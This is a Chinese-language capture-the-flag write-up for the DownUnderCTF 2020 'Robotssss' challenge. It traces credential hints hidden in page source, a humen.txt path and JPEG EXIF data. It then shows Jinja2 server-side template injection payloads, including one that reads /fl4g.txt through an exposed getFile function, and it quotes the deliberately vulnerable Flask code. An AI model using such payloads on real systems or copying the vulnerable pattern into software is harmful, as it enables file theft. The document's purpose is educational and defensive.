# DownUnderCTF 2020 - Robotssss

## 题目简述

题目把管理员凭据的线索分散在博客源码、类似 `robots.txt` 的路径和 JPEG EXIF 中。登录管理员后，`/admin.php` 把输入拼进 Jinja2 模板并调用 `render_template_string`，形成服务端模板注入（SSTI）。最终利用预先注册到 Jinja 全局命名空间的 `getFile` 函数读取 `/fl4g.txt`。

## 解题过程

注册普通账号并查看两篇博客的 HTML 源码，可以在 `<noscript>` 中找到二进制字符串。每 8 位转成一个 ASCII 字符：

```python
def bits_to_text(bits):
    return ''.join(
        chr(int(bits[i:i + 8], 2))
        for i in range(0, len(bits), 8)
    )

print(bits_to_text(
    "011010000111010101101101011001010110111000101110011101000111100001110100"
))
print(bits_to_text(
    "0110011001101100001101000110011100101110011101000111100001110100"
))
```

输出分别为：

```text
humen.txt
fl4g.txt
```

访问 `/humen.txt` 可见：

```text
User-agent: humans
Disallow: /Bender
```

`/Bender` 展示 `/static/bender.jpeg`。图片本身只是角色图，真正信息在 `Artist` EXIF 字段；只读提取后得到一串二进制，按 8 位 ASCII 解码为：

```text
admin:This-Is-The-Admin-Password-XD!
```

可用以下方式复现，不需要把图片嵌进 WP：

```bash
exiftool -Artist -b bender.jpeg
```

原官方说明把这里写成 Base58，但仓库中实际 `bender.jpeg` 的 `Artist` 字段是二进制 ASCII；数据库初始化源码也以明文保存了同一管理员密码。另一个 `/4dm1n_Cr3ds` 页面中的 Base58 字符串是干扰项。

用上述凭据登录后进入 `/admin.php`。输入先经过一个很弱的字符替换器，只移除 `<`、`>`、`_`、`[`、`]`，随后直接拼进模板：

```python
ui = html_escape(request.form['user_in'])
template += '<p class="echo">You typed: %s</p>' % ui
return render_template_string(template, ui=ui)
```

用无害算式确认 SSTI：

```jinja2
{{ 7*7 }}
```

页面返回 `49`。应用还显式注册了文件读取函数：

```python
def getFile(path):
    with open(path) as file:
        return file.read()

app.jinja_env.globals['getFile'] = getFile
```

该函数名不含被过滤的下划线，直接提交：

```jinja2
{{ getFile("/fl4g.txt") }}
```

得到：

```text
DUCTF{a15c011f-b595-4f7d-bc63-00dc972b3464}
```

## 方法总结

这是一条“隐藏线索 → 凭据 → SSTI”的组合链。EXIF 和二进制编码只是取得管理员身份的前置步骤，决定性漏洞仍是把不可信输入拼进 Jinja2 模板。字符黑名单无法安全过滤模板语法；应把输入作为普通模板变量渲染，并且不要向模板全局暴露任意文件读取函数。
